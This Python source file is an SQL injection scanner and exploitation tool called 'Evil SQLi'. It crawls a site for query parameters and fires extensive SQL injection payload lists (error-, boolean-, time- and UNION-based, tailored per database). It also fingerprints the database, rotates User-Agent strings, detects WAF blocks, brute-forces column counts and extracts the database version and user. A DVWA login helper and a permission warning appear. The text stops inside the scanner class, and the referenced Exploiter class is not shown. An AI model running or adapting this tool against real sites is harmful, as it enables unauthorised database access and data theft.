#!/usr/bin/env python3
"""
Evil SQLi: A Comprehensive SQL Injection Scanner
Automates discovery and exploitation of SQL injection vulnerabilities.
"""
import os
import random
import string
import re
import json
import time
import difflib
import logging
import sys
import math
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse, unquote_plus
import requests
from bs4 import BeautifulSoup

# ===========================
# Banner and Safety Notice
# ===========================
def Symbol():
    # Prints the tool's ASCII banner
    print("\n")
    try:
        import pyfiglet
        text = "Evil SQLi"
        ascii_art = pyfiglet.figlet_format(text, font="graffiti", width=200, justify="left")
    except Exception:
        ascii_art = " Evil SQLi "
    warning1 = "[!] WARNING: This tool should only be used on systems you own or have explicit permission to test."
    warning2 = "[!] Unauthorized testing is illegal and unethical."
    colors_hex = [
        "#FF0000", "#FF4500", "#FF6347", "#FF1493", "#6A0DAD", "#8A2BE2",
        "#0ABDE3", "#00BFFF", "#00FF7F", "#00FFC6", "#00FF00", "#32CD32",
        "#3A0071", "#8B008B",
    ]
    def hex_to_rgb(h):
        h = h.lstrip("#")
        return tuple(int(h[i:i+2], 16) for i in (0, 2, 4))
    colors = [hex_to_rgb(c) for c in colors_hex]
    def lerp(c1, c2, t):
        return tuple(int(a + (b - a) * t) for a, b in zip(c1, c2))
    def get_cosmic_color(pos):
        if pos <= 0: return colors[0]
        if pos >= 1: return colors[-1]
        seg_len = 1 / (len(colors) - 1)
        idx = int(pos / seg_len)
        t = (pos - seg_len * idx) / seg_len
        return lerp(colors[idx], colors[idx + 1], t)
    def rgb_escape(r, g, b):
        return f"\033[38;2;{r};{g};{b}m"
    visible_chars = [c for c in ascii_art if c not in [" ", "\n"]]
    total_visible = max(1, len(visible_chars))
    output, char_index = "", 0
    for ch in ascii_art:
        if ch == "\n":
            output += "\n"
        elif ch == " ":
            output += " "
        else:
            pos = char_index / total_visible
            r, g, b = get_cosmic_color(pos)
            output += rgb_escape(r, g, b) + ch
            char_index += 1
    output += "\033[0m"
    print(output)
    red_color = "\033[38;2;255;0;0m"
    reset_color = "\033[0m"
    print(f"{red_color}{warning1}{reset_color}")
    print(f"{red_color}{warning2}{reset_color}")
    print("\033[0m")

# ===========================
# Config and Colors
# ===========================
@dataclass
class Config:
    # Configuration for the scanner's operational parameters
    timeout: int = 10
    delay: float = 0.5
    max_depth: int = 2
    union_max_cols: int = 20
    time_based_threshold: float = 4.0
    similarity_threshold: float = 0.92
    use_cookies: bool = True

class Colors:
    # ANSI color codes for console output.
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BOLD_GREEN = "\033[1;92m"
    CYAN = "\033[96m"
    RESET = "\033[0m"

# ===========================
# Color Coded Logging
# ===========================
DEBUG = False

def info(msg: str) -> None: print(f"{Colors.GREEN}[*] {msg}{Colors.RESET}")

def warn(msg: str) -> None: print(f"{Colors.YELLOW}[!] {msg}{Colors.RESET}")

def error(msg: str) -> None: print(f"{Colors.RED}[-] {msg}{Colors.RESET}")

def good(msg: str) -> None: print(f"{Colors.BOLD_GREEN}[+] {msg}{Colors.RESET}")

def diag(msg: str) -> None: print(f"{Colors.CYAN}[*] {msg}{Colors.RESET}")

def debug(msg: str) -> None:
    if DEBUG: print(f"{Colors.CYAN}[DEBUG]{Colors.RESET} {msg}")

# ===========================
# Helpers
# ===========================
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

def domain_folder(target_url: str) -> str:
    # Creates a folder named after the target domain for saving results
    domain = urlparse(target_url).netloc or target_url.replace("://", "_")
    folder = os.path.join(SCRIPT_DIR, domain)
    os.makedirs(folder, exist_ok=True)
    return folder

def save_text(folder: str, name: str, lines: List[str]) -> None:
    # Saves a list of strings to a text file
    path = os.path.join(folder, name)
    with open(path, "w", encoding="utf-8") as f:
        for ln in lines: f.write(ln + "\n")
    info(f"Saved: {path}")

def save_json(folder: str, name: str, obj: dict) -> None:
    # Saves a dictionary to a JSON file
    path = os.path.join(folder, name)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(obj, f, indent=2, ensure_ascii=False)
    info(f"Saved: {path}")

def same_domain(a: str, b: str) -> bool:
    # Checks if two URLs belong to the same domain.
    return urlparse(a).netloc == urlparse(b).netloc

def normalize_url(u: str) -> str:
    # Normalizes a URL by sorting its query parameters
    pr = urlparse(u)
    qs = parse_qs(pr.query, keep_blank_values=True)
    sorted_qs = urlencode({k: v[0] if v else "" for k, v in sorted(qs.items())})
    return urlunparse((pr.scheme, pr.netloc, pr.path, pr.params, sorted_qs, ""))

def pretty_url(u: str) -> str:
    # Decodes a URL for human-readable display in logs
    return unquote_plus(u)

# ===========================
# HTTP Client
# ===========================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.43",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
]

DEFAULT_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
}

class HttpClient:
    # HTTP client wrapper with configurable delays, timeouts, and user-agent rotation
    def __init__(self, timeout: int = 10, delay: float = 0.5, use_cookies: bool = True):
        self.session = requests.Session()
        self.timeout = timeout
        self.delay = delay
        self.use_cookies = use_cookies
        if not use_cookies:
            self.session.cookies.clear()

    def login_dvwa(self, base_url: str, username="admin", password="password", security="low") -> bool:
        # Attempts to log into a DVWA instance and set its security level
        login_url = f"{base_url.rstrip('/')}/login.php"
        security_url = f"{base_url.rstrip('/')}/security.php"

        self.session.headers.update({
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        })

        try:
            resp = self.session.get(login_url, timeout=self.timeout)
            debug(f"Login page status: {resp.status_code}")
            token_match = re.search(r"name='user_token' value='([^']+)'", resp.text)
            user_token = token_match.group(1) if token_match else ""
            debug(f"CSRF token found: {bool(token_match)}")
        except Exception as e:
            error(f"Could not fetch DVWA login page: {e}")
            return False

        data = {
            "username": username,
            "password": password,
            "Login": "Login",
            "user_token": user_token
        }
        try:
            resp = self.session.post(login_url, data=data, timeout=self.timeout, allow_redirects=True)
            debug(f"Login response URL: {resp.url}")
            debug(f"Login response status: {resp.status_code}")
            if "login.php" in resp.url.lower():
                warn("DVWA login failed — check credentials or CSRF token")
                error_match = re.search(r'<p class="error">(.*?)</p>', resp.text, re.IGNORECASE)
                if error_match:
                    warn(f"Login error: {error_match.group(1)}")
                return False
        except Exception as e:
            error(f"DVWA login request failed: {e}")
            return False

        try:
            sec_resp = self.session.get(security_url, timeout=self.timeout)
            token_match = re.search(r"name='user_token' value='([^']+)'", sec_resp.text)
            user_token = token_match.group(1) if token_match else ""
            data = {"security": security, "seclev_submit": "Submit", "user_token": user_token}
            self.session.post(security_url, data=data, timeout=self.timeout, allow_redirects=True)
            good(f"DVWA login successful, security set to '{security}'")
            return True
        except Exception as e:
            error(f"Could not set DVWA security: {e}")
            return False

    def get(self, url: str) -> Optional[requests.Response]:
        # Performs an HTTP GET request with a randomized User-Agent.
        time.sleep(self.delay)
        headers = DEFAULT_HEADERS.copy()
        headers["User-Agent"] = random.choice(USER_AGENTS)
        debug(f"HTTP GET -> {pretty_url(url)}")
        debug(f"Headers: {headers}")
        try:
            response = self.session.get(
                url, headers=headers, timeout=self.timeout, allow_redirects=True
            )
            debug(f"Status: {response.status_code} | len(body)= {len(response.text)} | content-type= {response.headers.get('Content-Type')}")
            response.raise_for_status()
            return response
        except requests.exceptions.HTTPError as e:
            if e.response is not None and e.response.status_code == 403:
                warn(f"Access denied (403) for {pretty_url(url)} — try adjusting headers or cookies")
            else:
                error(f"HTTP Error: {e} for {pretty_url(url)}")
        except requests.exceptions.Timeout:
            error(f"Timeout occurred for {pretty_url(url)}")
        except requests.exceptions.RequestException as e:
            error(f"Request failed: {pretty_url(url)} ({e})")
        return None

# ===========================
# Crawling
# ===========================
@dataclass
class CrawlResult:
    # Stores the result of a crawl: a URL and its list of parameters
    url: str
    params: List[str] = field(default_factory=list)

class Crawler:
    # A web crawler that discovers URLs with query string parameters
    def __init__(self, base_url: str, depth: int = 2, client: Optional[HttpClient] = None):
        self.base_url = base_url.rstrip("/")
        self.depth = max(1, depth)
        self.client = client or HttpClient()
        self.visited: Set[str] = set()
        self.endpoints: Dict[str, Set[str]] = {}

    def run(self) -> List[CrawlResult]:
        # Starts the crawling process and returns discovered endpoints.
        info(f"Starting crawl on: {self.base_url}")
        self._crawl(self.base_url, self.depth)
        results: List[CrawlResult] = []
        for u, params in self.endpoints.items():
            results.append(CrawlResult(u, sorted(list(params))))
        debug(f"Crawl discovered {len(results)} endpoints with params")
        return results

    def _crawl(self, url: str, depth: int) -> None:
        # Recursively crawls the site to find links and parameters
        url = normalize_url(url)
        if depth <= 0 or url in self.visited:
            debug(f"Skipping (visited/depth): {url} (depth= {depth})")
            return
        self.visited.add(url)
        resp = self.client.get(url)
        if not resp or "text/html" not in (resp.headers.get("Content-Type") or ""):
            debug(f"Non-HTML or no response: {url}")
            return
        soup = BeautifulSoup(resp.text, "html.parser")
        pr = urlparse(url)
        if pr.query:
            params = list(parse_qs(pr.query, keep_blank_values=True).keys())
            self.endpoints.setdefault(url, set()).update(params)
            info(f"Found endpoint: {url} -> {params}")
        for a in soup.find_all("a", href=True):
            href = a["href"]
            nxt = urljoin(url, href)
            if not same_domain(nxt, self.base_url):
                continue
            link_pr = urlparse(nxt)
            if link_pr.query:
                link_params = list(parse_qs(link_pr.query, keep_blank_values=True).keys())
                self.endpoints.setdefault(nxt, set()).update(link_params)
                info(f"Found link endpoint: {nxt} -> {link_params}")
            self._crawl(nxt, depth - 1)

# ===========================
# DBMS Signatures and Payloads
# ===========================
DBMS_SIGNATURES = {
    "MySQL": [
        "you have an error in your sql syntax", "warning: mysql", "mysql_fetch",
        "mysql_num_rows", "mysqli", "for the right syntax to use",
    ],
    "PostgreSQL": ["pg_query", "pg_connect", "postgresql", "psql:"],
    "MSSQL": [
        "microsoft odbc", "sql server", "oledbexception", "mssql",
        "unclosed quotation mark after the character string",
    ],
    "Oracle": ["ora-", "oracle error", "quoted string not properly terminated"],
    "SQLite": ["sqlite error", "sql logic error", "sqlite3"],
}

SQL_ERROR_PATTERNS = [
    "you have an error in your sql syntax","warning: mysql",
    "mysql_fetch","mysql_num_rows",
    "mysqli","for the right syntax to use",
    "pg_query","pg_connect",
    "postgresql","psql:",
    "microsoft odbc","sql server",
    "oledbexception","mssql",
    "unclosed quotation mark after the character string","ora-",
    "oracle error","quoted string not properly terminated",
    "sqlite error","sql logic error",
    "sqlite3","syntax error",
    "unexpected token","unknown column",
    "table.*doesn't exist","division by zero",
    "violation of.*constraint","conversion failed",
    "incorrect syntax","invalid parameter",
    "argument type","cannot be cast",
    "must be of type","invalid input syntax",
    "type mismatch","wrong number of arguments",
]

BUILTIN_PAYLOADS = [
    "'","''","`","``","\"","\"\"","' OR '1'='1",
    "' OR '1'='1' --","' OR '1'='1' /*","' OR 1=1--","' OR 1=1#",
    "' OR 1=1/*","') OR ('1'='1--","' OR 'a'='a","' OR 'a'='a'--",
    "' OR 'a'='a'/*","\" OR \"\"=\"","\" OR 1=1--","\" OR 1=1#",
    "\" OR 1=1/*","') OR ('1'='1--","' OR SLEEP(5)#","' OR SLEEP(5)/*",
    "' UNION SELECT NULL--","' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--","' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT NULL,NULL--","' UNION ALL SELECT NULL,NULL,NULL--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--","' AND (SELECT * FROM (SELECT(SLEEP(5)))a)#",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)/*","' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)#","' OR (SELECT * FROM (SELECT(SLEEP(5)))a)/*",
    "' WAITFOR DELAY '0:0:5'--","' WAITFOR DELAY '0:0:5'#","' WAITFOR DELAY '0:0:5'/*",
    "'; WAITFOR DELAY '0:0:5'--","'; WAITFOR DELAY '0:0:5'#","'; WAITFOR DELAY '0:0:5'/*",
    "' AND SLEEP(5)--","' AND SLEEP(5)#","' AND SLEEP(5)/*","' OR SLEEP(5)--",
    "' AND (SELECT SUBSTRING(@@version,1,1))='X'--","' AND (SELECT SUBSTRING(@@version,1,1))='X'#",
    "' AND (SELECT SUBSTRING(@@version,1,1))='X'/*","' OR (SELECT SUBSTRING(@@version,1,1))='X'--",
    "' OR (SELECT SUBSTRING(@@version,1,1))='X'#","' OR (SELECT SUBSTRING(@@version,1,1))='X'/*",
]

DBMS_SPECIFIC_PAYLOADS = {
    "MySQL": {
        "error_based": ["' AND EXTRACTVALUE(1,CONCAT(0x7e,USER(),0x7e))-- -",
                        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -"],
        "time_based": ["' AND SLEEP(5)-- -",
                       "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -"],
        "boolean_based": ["' OR 1=1-- -", "' OR 'a'='a'"],
        "union_based": ["' UNION SELECT NULL,NULL,NULL-- -"]
    },
    "PostgreSQL": {
        "error_based": ["' AND CAST((SELECT version()) AS INTEGER)-- -",
                        "' AND 1=CAST((SELECT version()) AS INTEGER)-- -"],
        "time_based": ["' AND (SELECT pg_sleep(5))-- -",
                       "' AND 123=(SELECT 123 FROM pg_sleep(5))-- -"],
        "boolean_based": ["' OR '1'='1'-- -"],
        "union_based": ["' UNION SELECT NULL,NULL,NULL-- -"]
    },
    "MSSQL": {
        "error_based": ["' AND 1=CONVERT(INT,(SELECT @@version))-- -",
                        "' AND 1=@@version-- -"],
        "time_based": ["' WAITFOR DELAY '0:0:5'-- -",
                       "' IF (SELECT COUNT(*) FROM sysobjects)>0 WAITFOR DELAY '0:0:5'-- -"],
        "boolean_based": ["' OR 1=1-- -"],
        "union_based": ["' UNION SELECT NULL,NULL,NULL-- -"]
    },
    "Oracle": {
        "error_based": ["' AND (SELECT * FROM (SELECT CTXSYS.DRITHSX.SN(1,(SELECT version FROM v$instance)) FROM dual)) IS NOT NULL-- -"],
        "time_based": ["' AND (SELECT COUNT(*) FROM all_users WHERE username='SYS' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=0)>0-- -"],
        "boolean_based": ["' OR 1=1-- -"],
        "union_based": ["' UNION SELECT NULL,NULL FROM dual-- -"]
    },
    "SQLite": {
        "error_based": ["' AND load_extension('nonexistent')-- -"],
        "time_based": ["' AND (SELECT randomblob(1000000000))-- -"],
        "boolean_based": ["' OR 1=1-- -"],
        "union_based": ["' UNION SELECT NULL,NULL,NULL-- -"]
    },
    "Generic": {
        "error_based": ["'", "''", "`", "``", "\"", "\"\""],
        "time_based": ["' AND 1=0-- -", "' OR IF(1=1,SLEEP(5),0)-- -"],
        "boolean_based": ["' OR '1'='1'", "' OR '1'='0'", "OR 1=1", "OR 1=0"],
        "union_based": ["' UNION SELECT NULL-- -", "' UNION ALL SELECT NULL-- -"]
    }
}

def detect_dbms(html_lower: str) -> Optional[str]:
    # Scans HTML content for database-specific error signatures
    for db, sigs in DBMS_SIGNATURES.items():
        for s in sigs:
            if s in html_lower:
                return db
    return None

def apply_payload_to_url(url: str, param: str, payload: str, append: bool = True) -> str:
    # Injects a payload into a specified URL parameter
    pr = urlparse(url)
    qs = parse_qs(pr.query, keep_blank_values=True)
    if param in qs:
        if append:
            cur = qs[param][0] if qs[param] else ""
            qs[param] = [cur + payload]
        else:
            qs[param] = [payload]
    new_query = urlencode({k: v[0] if v else "" for k, v in qs.items()})
    return urlunparse((pr.scheme, pr.netloc, pr.path, pr.params, new_query, ""))

# ===========================
# Findings
# ===========================
@dataclass
class Finding:
    # Stores information about a confirmed SQL injection vulnerability
    url: str
    param: str
    technique: str
    payload: str
    dbms: Optional[str] = None
    severity: str = "Unknown"
    confidence: float = 0.0
    columns: Optional[int] = None
    version: Optional[str] = None
    current_user: Optional[str] = None

    def to_dict(self):
        # Converts the finding into a dictionary for JSON serialization
        return {
            "url": self.url, "param": self.param, "technique": self.technique,
            "payload": self.payload, "dbms": self.dbms, "severity": self.severity,
            "confidence": self.confidence, "columns": self.columns,
            "version": self.version, "current_user": self.current_user,
        }

# ===========================
# Scanning
# ===========================
class Scanner:
    # Core class for testing parameters for SQL injection vulnerabilities
    def __init__(self, client: Optional[HttpClient] = None):
        self.client = client or HttpClient(timeout=10)
        self.findings: List[Finding] = []  # List to store confirmed vulnerabilities
        self.enumerated: Set[Tuple[str, str]] = set()  # For future use (e.g., preventing duplicate tests)
        self.manual_column_count: Optional[int] = None  # Allows user to specify column count manually
        
    def injection(self):
        # Displays a cool ASCII art animation after successful data extraction
        art_lines = [
            "    ___ ",
            "   __H__"
        ]
        for line in art_lines:
            print(line)
        time.sleep(0.5)
        print("    [▓]")  
        time.sleep(0.5)
        print("    [▓]")  
        time.sleep(0.5)
        print("    [▓]")  
        time.sleep(0.5)
        print("     V")

    def _calculate_severity(self, technique: str, dbms: Optional[str] = None) -> str:
        # Assigns a severity level based on the injection technique and DBMS.
        severity_map = {
            "Union-Based": "High",
            "Error-Based": "High",
            "Time-Based": "Medium",
            "Boolean-Based": "Medium",
        }
        severity = severity_map.get(technique, "High")
        # Adjust severity for specific DBMS
        if dbms in ["Oracle", "MSSQL"] and severity == "High":
            severity = "Critical"
        elif dbms in ["MySQL", "PostgreSQL"] and severity == "High":
            severity = "High"
        return severity

    def _calculate_confidence(self, technique: str) -> float:
        # Assigns a confidence score based on the detection technique.
        confidence_map = {
            "Union-Based": 0.95, "Error-Based": 0.90,
            "Time-Based": 0.85, "Boolean-Based": 0.80,
        }
        return confidence_map.get(technique, 0.75)

    def fingerprint_dbms(self, url: str, param: str) -> Optional[str]:
        # Actively tries to fingerprint the backend database
        debug(f"Fingerprinting DBMS for {url} param= {param}")
        fingerprint_payloads = {
            "MySQL": [
                ("' AND SLEEP(5)-- -", "time"),
                ("' AND (SELECT @@version)-- -", "function"),
                ("' AND (SELECT 'test' RLIKE '^t')-- -", "function"),
            ],
            "PostgreSQL": [
                ("' AND (SELECT pg_sleep(5))-- -", "time"),
                ("' AND (SELECT version())-- -", "function"),
                ("' AND (SELECT 'test' ~ '^t')-- -", "function"),
            ],
            "MSSQL": [
                ("'; WAITFOR DELAY '0:0:5'-- -", "time"),
                ("' AND (SELECT @@version)-- -", "function"),
                ("' AND (SELECT CHAR(65))-- -", "function"),
            ],
            "Oracle": [
                ("' AND (SELECT DBMS_LOCK.SLEEP(5) FROM DUAL)-- -", "time"),
                ("' AND (SELECT banner FROM v$version WHERE rownum=1)-- -", "function"),
                ("' AND (SELECT CHR(65) FROM DUAL)-- -", "function"),
            ],
            "SQLite": [
                ("' AND (SELECT randomblob(1000000000))-- -", "time"),
                ("' AND (SELECT sqlite_version())-- -", "function"),
                ("' AND (SELECT hex('A'))-- -", "function"),
            ]
        }
        baseline_time = self._avg_elapsed(url, n=2)
        debug(f"Baseline avg elapsed: {baseline_time:.3f}s")
        for dbms, payloads in fingerprint_payloads.items():
            for payload, technique in payloads:
                test_url = apply_payload_to_url(url, param, payload, append=True)
                debug(f"[FP] DBMS= {dbms} technique= {technique} payload= {payload} -> {pretty_url(test_url)}") # <-- MODIFIED
                if technique == "time":
                    start = time.time()
                    resp = self.client.get(test_url)
                    elapsed = time.time() - start
                    debug(f"[FP] Response {'OK' if resp else 'None'} elapsed= {elapsed:.3f}s")
                    if resp and elapsed >= 4.0:
                        return dbms
                else:
                    resp = self.client.get(test_url)
                    debug(f"[FP] Resp status= {'OK' if resp else 'None'}")
                    if resp and resp.status_code < 500:
                        return dbms
        return None

    def _is_blocked(self, html: str) -> bool:
        # Checks if the response HTML indicates a WAF blocking mechanism
        BLOCK_INDICATORS = [
            "Cloudflare", "Incapsula", "Akamai", "Imperva", "Barracuda",
            "ModSecurity", "WebKnight", "Sucuri", "SiteLock", "Comodo",
            "403 Forbidden", "Access Denied", "Security Blocked",
            "Your request has been blocked", "Web Application Firewall",
            "Request rejected", "Security violation"
        ]
        DVWA_NORMAL_CONTENT = [
            "login", "csrf", "token", "dvwa", "security", "captcha",
            "phpids", "help", "about", "instructions", "setup", "logout"
        ]
        if not html:
            return False
        html_lower = html.lower()
        block_detected = any(indicator.lower() in html_lower for indicator in BLOCK_INDICATORS)
        dvwa_content = any(indicator in html_lower for indicator in DVWA_NORMAL_CONTENT)
        if block_detected and not dvwa_content:
            debug("WAF/CAPTCHA/Block indicator detected")
            return True
        return False

    def _avg_elapsed(self, url: str, n: int = 2) -> float:
        # Calculates the average response time for a URL
        times = []
        for _ in range(n):
            t0 = time.time()
            _ = self.client.get(url)
            times.append(time.time() - t0)
            time.sleep(0.2)
        avg = sum(times) / len(times) if times else 0.0
        debug(f"Avg elapsed over {n} tries: {avg:.3f}s")
        return avg

    def check_error_based(self, base_html: str, test_html: str) -> Tuple[bool, Optional[str]]:
        # Compares HTML to detect SQL error messages
        test_lower = (test_html or "").lower()
        for e in SQL_ERROR_PATTERNS:
            if e.lower() in test_lower:
                return True, detect_dbms(test_lower)
        db = detect_dbms(test_lower)
        return (db is not None), db

    def check_boolean_based_similarity(self, true_html: str, false_html: str, threshold: float = 0.92) -> bool:
        # Compares HTML content of true/false conditions for Boolean-Based SQLi
        if not (true_html and false_html):
            return False
        a = re.sub(r"\s+", " ", true_html)
        b = re.sub(r"\s+", " ", false_html)
        ratio = self._similarity_ratio(a, b)
        debug(f"Boolean-based similarity ratio= {ratio:.3f} (threshold= {threshold})")
        return ratio < threshold

    def check_time_based(self, elapsed_sec: float, threshold: float = 4.0) -> bool:
        # Checks if elapsed time exceeds threshold for Time-Based SQLi.
        debug(f"Time-based check elapsed= {elapsed_sec:.3f}s threshold= {threshold}")
        return elapsed_sec >= threshold

    def _similarity_ratio(self, a: str, b: str) -> float:
        # Calculates the similarity ratio between two strings
        if not a or not b:
            return 0.0
        return difflib.SequenceMatcher(None, a, b).ratio()

    def _rand_token(self, n=8) -> str:
        # Generates a random alphanumeric token for UNION-based injection 
        return "X" + "".join(random.choices(string.ascii_uppercase + string.digits, k=n)) + "X"

    def _calculate_average(self, ratios: List[float]) -> float:
        # Calculates the arithmetic mean of a list of numbers
        return sum(ratios) / len(ratios) if ratios else 0.0

    def _calculate_stdev(self, ratios: List[float]) -> float:
        # Calculates the standard deviation of a list of numbers
        if len(ratios) < 2:
            return 0.0
        avg = self._calculate_average(ratios)
        variance = sum((x - avg) ** 2 for x in ratios) / (len(ratios) - 1)
        return math.sqrt(variance)

    def _determine_column_count(self, url: str, param: str, is_numeric_hint: bool, max_cols: int = 20) -> Optional[int]:
        # Attempts to determine the number of columns for a UNION-based attack
        debug(f"Determining column count for {url} param= {param} (numeric hint: {is_numeric_hint}) up to {max_cols}")
        baseline_resp = self.client.get(url)
        if not baseline_resp:
            return None
        baseline_html = baseline_resp.text
        diag("Attempting to determine column count using ORDER BY")
        debug("Trying ORDER BY method for column count detection (testing numeric and string contexts)")
        order_by_found_count = None
        prefixes_to_test = []
        if is_numeric_hint:
            prefixes_to_test.extend(["", "'"])
        else:
            prefixes_to_test.extend(["'", ""])
        for prefix in prefixes_to_test:
            debug(f"Testing ORDER BY with prefix: '{prefix}'")
            found_count_for_prefix = None
            for cols in range(1, max_cols + 2):
                order_payload = f"{prefix} ORDER BY {cols}-- -"
                test_url = apply_payload_to_url(url, param, order_payload, append=True)
                debug(f"ORDER BY test cols= {cols} payload= {order_payload} -> {pretty_url(test_url)}")
                resp = self.client.get(test_url)
                if not resp:
                    debug(f"No response for ORDER BY {cols} with prefix '{prefix}'")
                    break
                resp_text = resp.text
                resp_text_lower = resp_text.lower()
                column_count_errors = [
                    "unknown column", "unknown order by column", "invalid column number",
                    "order by position", "invalid column", "column index out of range",
                    "invalid ordinal", "order by number", "column.*not found",
                    "the order by position number.*is out of range", "order by clause.*out of range",
                    "unknown column.*in.*order clause", "invalid column name"
                ]
                has_column_error = any(re.search(error, resp_text_lower, re.IGNORECASE) for error in column_count_errors)
                generic_errors = [
                    "sql syntax", "syntax error", "mysql server", "postgresql query",
                    "oracle error", "microsoft.*odbc", "odbc.*driver", "sqlserver",
                    "pdoexception", "query failed", "database error"
                ]
                has_generic_error = any(re.search(error, resp_text_lower, re.IGNORECASE) for error in generic_errors)
                similarity = self._similarity_ratio(baseline_html, resp_text)
                content_difference = abs(len(baseline_html) - len(resp_text)) > len(baseline_html) * 0.3
                if has_column_error or (has_generic_error and similarity < 0.7):
                    debug(f"Error detected at ORDER BY {cols} with prefix '{prefix}', assuming column count = {cols - 1}")
                    found_count_for_prefix = cols - 1
                    break
                elif similarity < 0.6 and content_difference:
                    debug(f"Significant content difference detected at ORDER BY {cols} with prefix '{prefix}' (sim: {similarity:.2f}), might be column limit or app logic.")
            if found_count_for_prefix is not None:
                debug(f"ORDER BY method successful with prefix '{prefix}', column count = {found_count_for_prefix}")
                return found_count_for_prefix
        debug("ORDER BY method inconclusive for all prefixes, trying UNION SELECT method with statistical analysis and token-based detection")
        diag("Attempting UNION-based column count detection with token method")
        debug("Attempting token-based UNION column count detection...")
        for prefix in prefixes_to_test:
            debug(f"Testing UNION SELECT token method with prefix: '{prefix}'")
            for count in range(1, max_cols + 1):
                token = self._rand_token(6)
                vals = ["NULL"] * count
                vals[0] = f"'{token}'"
                union_payload = f"{prefix} UNION SELECT {','.join(vals)}-- -"
                if is_numeric_hint and prefix == "":
                    union_payload = f"{prefix}-1 UNION SELECT {','.join(vals)}-- -"

                test_url = apply_payload_to_url(url, param, union_payload, append=True)
                debug(f"Try UNION token test prefix='{prefix}' cols= {count} (pos=0) payload= {union_payload} -> {pretty_url(test_url)}")
                resp = self.client.get(test_url)

                if resp and token in resp.text:
                    good(f"Column count confirmed via UNION-based injection (token found in position 0): {count} with prefix '{prefix}'")
                    return count
                positions_to_try = []
                if count > 1:
                    positions_to_try.append(count - 1)
                if count > 2:
                    positions_to_try.append(count // 2)

                for pos in positions_to_try:
                    vals = ["NULL"] * count
                    vals[pos] = f"'{token}'"
                    union_payload = f"{prefix} UNION SELECT {','.join(vals)}-- -"
                    if is_numeric_hint and prefix == "":
                        union_payload = f"{prefix}-1 UNION SELECT {','.join(vals)}-- -"
                    test_url = apply_payload_to_url(url, param, union_payload, append=True)
                    debug(f"Try UNION token test prefix='{prefix}' cols= {count} (pos={pos}) payload= {union_payload} -> {pretty_url(test_url)}")
                    resp = self.client.get(test_url)
                    if resp and token in resp.text:
                        good(f"Column count confirmed via UNION-based injection (token found in position {pos}): {count} with prefix '{prefix}'")
                        return count
                if resp:
                    error_detected, _ = self.check_error_based(baseline_html, resp.text)
                    resp_lower = resp.text.lower()
                    if error_detected and ("union" in resp_lower or "column" in resp_lower or "operand" in resp_lower):
                        debug(f"Union column count error detected at {count} columns with prefix '{prefix}'")
                        break
                    
        warn(f"Could not determine column count up to {max_cols} columns for parameter '{param}' using tested prefixes.")
        return None

    def _test_boolean_based(self, url: str, param: str, dbms: Optional[str], numeric_like: bool) -> Optional[Finding]:
        # Tests for Boolean-Based SQL Injection
        diag(f"Trying Boolean-Based test for parameter '{param}'...")
        contexts = []
        if numeric_like:
            contexts.append(("", " OR 1=1", " AND 1=2"))
        else:
            contexts.append(("'", "' OR 1=1", "' AND 1=2"))
        if numeric_like:
            contexts.append(("'", "' OR 1=1", "' AND 1=2"))
        else:
            contexts.append(("", " OR 1=1", " AND 1=2"))

        for prefix, true_condition, false_condition in contexts:
            true_payload = f"{true_condition}-- "
            false_payload = f"{false_condition}-- "
            
            true_url = apply_payload_to_url(url, param, prefix + true_payload, append=True)
            false_url = apply_payload_to_url(url, param, prefix + false_payload, append=True)
            
            debug(f"Boolean test with prefix='{prefix}' -> TRUE={pretty_url(true_url)} | FALSE={pretty_url(false_url)}")
            
            true_resp = self.client.get(true_url)
            false_resp = self.client.get(false_url)
            
            if true_resp and false_resp and self.check_boolean_based_similarity(true_resp.text, false_resp.text, threshold=0.92):
                good(f"Confirmed Boolean-Based SQLi on {param} with prefix '{prefix}'")
                severity = self._calculate_severity("Boolean-Based", dbms)
                confidence = self._calculate_confidence("Boolean-Based")
                finding = Finding(url, param, "Boolean-Based", prefix + true_payload, dbms, severity, confidence)
                
                info(f"Attempting to determine the number of columns for parameter '{param}'...")
                if self.manual_column_count is not None:
                    cols = self.manual_column_count
                    info(f"Using manually specified column count: {cols} for parameter '{param}'")
                else:
                    cols = self._determine_column_count(url, param, numeric_like, max_cols=20)
                    debug(f"Column count determined: {cols} (calculated once)")
                if cols:
                    finding.columns = cols
                    good(f"Determined column count = {cols} for parameter '{param}'")
                    exploiter = Exploiter(self.client, url, param, dbms, cols)
                    finding.version = exploiter.get_version()
                    if finding.version:
                        good("DB Version Found")
                        self.injection()
                        good(f"Extracted DB Version: {finding.version}")
                    finding.current_user = exploiter.get_current_user()
                    if finding.current_user:
                        good("DB User Found")
                        self.injection()
                        good(f"Extracted Current User: {finding.current_user}")
                return finding

        return None

